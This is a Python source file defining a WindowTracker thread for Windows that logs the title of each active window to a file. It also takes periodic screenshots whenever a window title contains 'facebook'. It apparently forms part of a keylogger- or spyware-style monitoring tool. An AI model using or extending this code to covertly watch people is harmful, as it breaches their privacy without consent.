import win32gui, time, win32process
from threading import Thread
from Screenshot import Screenshot



class WindowTracker(Thread):

    def __init__(self, screenshot, filehandler):
        Thread.__init__(self, name='window tracking')
        self.__debug = False
        self.__activeWindow = None
        self.__samplingFrequency = 0.1
        self.__screenshot = screenshot
        self.__screenshotTimer = 0
        self.__screenshotFrequency = 50
        self.__screenshotTrigger = ['facebook']
        self.__filehandler = filehandler



    def run(self):
        while True:
            time.sleep(self.__samplingFrequency)
            activeWindow = win32gui.GetForegroundWindow()
            activeWindowText = win32gui.GetWindowText(activeWindow)
            self.__examineWindow(activeWindowText)
            self.checkTrigger(activeWindowText)



    def __examineWindow(self, activeWindowTitle:str) -> None:
        if self.__activeWindow != activeWindowTitle:
            self.__activeWindow = activeWindowTitle
            windowTitle = '\n'*2 + f'{self.__activeWindow}'.center(100,'-') + '\n'
            if self.__debug:
                print(windowTitle)
            else:
                self.__filehandler.writeToFile(windowTitle)



    def checkTrigger(self, activeWindowText:str):
        for trigger in self.__screenshotTrigger:
            if trigger in activeWindowText.lower():
                self.__screenshotTimer += 1
                if self.__debug:
                    print(self.__screenshotTimer)
                if self.__screenshotTimer >= 50:
                    self.__screenshot.takeScreenshot()
                    self.__screenshotTimer = 0
            else:
                self.__screenshotTimer = 0




if __name__ == "__main__":
    from FileHandler import FileHandler
    from os import system, getcwd
    system('cls')
    fileHandler = FileHandler()
    screenshot = Screenshot()
    windowTracker = WindowTracker(screenshot, fileHandler)
    windowTracker.start()